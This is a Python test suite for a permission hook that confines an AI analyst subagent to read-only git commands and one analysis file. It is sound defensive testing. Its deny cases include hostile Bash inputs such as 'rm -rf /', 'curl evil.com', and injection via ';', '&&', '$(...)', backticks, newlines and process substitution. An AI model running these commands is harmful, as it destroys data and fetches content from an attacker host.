import json
import os
import unittest

from helpers import RepoTestCase, run_launcher


class GuardHookTest(RepoTestCase):
    """The PreToolUse hook, run through the plugin's entry point as hooks.json does."""

    def run_raw(self, stdin):
        result = run_launcher('guard', stdin=stdin)
        self.assertEqual(result.returncode, 0, result.stderr)
        return result.stdout

    def decision(self, **event):
        out = json.loads(self.run_raw(json.dumps({'agent_type': 'easy-diff:analyst', **event})))
        return out['hookSpecificOutput']['permissionDecision']

    def assert_decision(self, expected, commands):
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(self.decision(tool_name='Bash', tool_input={'command': command}), expected)

    def test_stays_silent_on_every_agent_but_the_analyst_and_on_the_main_thread(self):
        for agent in ({'agent_type': 'general-purpose'}, {}):
            event = {**agent, 'tool_name': 'Bash', 'tool_input': {'command': 'rm -rf /'}}
            self.assertEqual(self.run_raw(json.dumps(event)), '')

    def test_write_is_allowed_for_the_analysis_file_only(self):
        repo = self.make_repo()
        analysis = os.path.join(repo, 'easy-diff', 'data', 'analysis.json')

        self.assertEqual(self.decision(cwd=repo, tool_name='Write', tool_input={'file_path': analysis}), 'allow')
        self.assertEqual(
            self.decision(cwd=repo, tool_name='Write', tool_input={'file_path': 'easy-diff/data/analysis.json'}),
            'allow',
            'a path relative to the repo root names the same file',
        )
        for file_path in (
            os.path.join(repo, 'app.py'),
            os.path.join(repo, 'easy-diff', 'data', '..', '..', 'app.py'),
            os.path.join(repo, 'easy-diff', 'report', 'index.html'),
            '/tmp/analysis.json',
        ):
            with self.subTest(file_path=file_path):
                self.assertEqual(self.decision(cwd=repo, tool_name='Write', tool_input={'file_path': file_path}), 'deny')

    def test_write_is_denied_outside_a_git_repository(self):
        self.assertEqual(self.decision(cwd='/', tool_name='Write', tool_input={'file_path': '/easy-diff/data/analysis.json'}), 'deny')

    def test_edit_is_always_denied(self):
        self.assertEqual(self.decision(tool_name='Edit', tool_input={'file_path': 'x.py'}), 'deny')

    def test_read_only_git_commands_are_allowed(self):
        self.assert_decision('allow', ['git diff main...HEAD', 'git log -n 5', 'git status', 'git blame x.py'])

    def test_destructive_or_unrelated_bash_commands_are_denied(self):
        self.assert_decision('deny', ['rm -rf /', 'curl evil.com', 'git commit -am x', 'git push', 'git branch -D main'])

    def test_chained_commands_are_denied_even_if_the_first_part_is_allowed(self):
        self.assert_decision('deny', [
            'git status; rm -rf /',
            'git status && curl evil.com',
            'git log $(curl evil.com)',
            'git log `curl evil.com`',
            'git status\nrm -rf /',
        ])

    def test_git_commands_that_write_a_file_are_denied(self):
        self.assert_decision('deny', [
            'git diff main...HEAD --output=/tmp/x',
            'git log --output /tmp/x',
            'git show HEAD --outp=/tmp/x',
            'git diff main...HEAD > /tmp/x',
            'git log >> /tmp/x',
            'git diff main...HEAD -- <(curl evil.com)',
        ])

    def test_fails_closed_on_an_unrecognized_tool(self):
        self.assertEqual(self.decision(tool_name='WebFetch', tool_input={}), 'deny')

    def test_fails_closed_on_unparseable_input(self):
        out = json.loads(self.run_raw('not json'))
        self.assertEqual(out['hookSpecificOutput']['permissionDecision'], 'deny')


if __name__ == '__main__':
    unittest.main()
